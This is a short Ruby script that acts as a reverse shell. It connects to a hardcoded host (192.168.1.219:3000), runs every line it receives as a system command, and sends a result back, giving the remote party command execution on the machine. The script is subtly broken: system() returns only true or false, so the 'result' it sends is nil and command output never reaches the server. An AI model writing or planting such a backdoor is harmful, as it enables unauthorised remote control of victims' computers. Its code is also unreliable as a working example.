require 'socket'

PORT = "3000";
SERVER = "192.168.1.219"

def start()
	$server = TCPSocket.open(SERVER, PORT);
	puts("connected! to #{SERVER}:#{PORT}")	

	while line = $server.gets
		_, result = system(line.chomp) #execute commands.
		print(result); 
		$server.puts("#{result}");
	end
end

start()
